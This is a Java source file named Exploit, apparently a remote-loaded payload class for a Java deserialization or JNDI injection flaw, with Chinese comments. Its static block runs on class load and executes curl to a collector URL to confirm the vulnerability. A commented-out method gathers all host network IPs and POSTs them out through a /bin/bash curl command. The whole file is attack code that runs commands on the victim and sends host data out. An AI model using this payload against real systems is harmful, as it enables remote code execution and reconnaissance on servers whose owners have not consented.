import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;
import java.util.List;

/**
 * 漏洞利用：获取漏洞服务的主机所有IP
 * 
 * @author Hellxz
 * @date 2021/12/11 07:43
 */
public class Exploit {
    // 接收获取的IP的地址
    private static final String EXPLOIT_URL = "http://127.0.0.1:9999";
    static {
        try {
            // 测试是否有漏洞
            execCommand("curl " + EXPLOIT_URL + "/test");
            // 获取利用机ip
//            getHostIPsJson();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void getHostIPsJson() throws Exception {
        StringBuffer sb = new StringBuffer("{\"IP\":[");
        Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
        while (networkInterfaces.hasMoreElements()) {
            List<InterfaceAddress> interfaceAddresses = networkInterfaces.nextElement().getInterfaceAddresses();
            for (InterfaceAddress ia : interfaceAddresses) {
                InetAddress address = ia.getAddress();
                String hostAddress = address.getHostAddress();
                sb.append("\"").append(hostAddress).append("\",");
            }
        }
        sb.deleteCharAt(sb.length() - 1).append("]}");
        String[] split = { "/bin/bash", "-c", "curl -X POST '" + EXPLOIT_URL
                + "/getExploitIP' -H 'Content-Type: application/json' -d '" + sb.toString() + "'" };
        System.out.println(execCommand(split));
    }

    private static String execCommand(String[] cmd) throws Exception {
        Process p = Runtime.getRuntime().exec(cmd);
        return readResult(p);
    }

    private static String execCommand(String cmd) throws Exception {
        Process p = Runtime.getRuntime().exec(cmd);
        return readResult(p);
    }

    private static String readResult(Process process) throws IOException, InterruptedException {
        StringBuffer buf = new StringBuffer();
        InputStream is = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        String line;
        while ((line = reader.readLine()) != null) {
            buf.append(line + "\n");
        }
        process.waitFor();
        is.close();
        reader.close();
        process.destroy();
        return buf.toString();
    }

    public static void main(String[] args) throws InstantiationException, IllegalAccessException {
        Exploit.class.newInstance();
    }
}
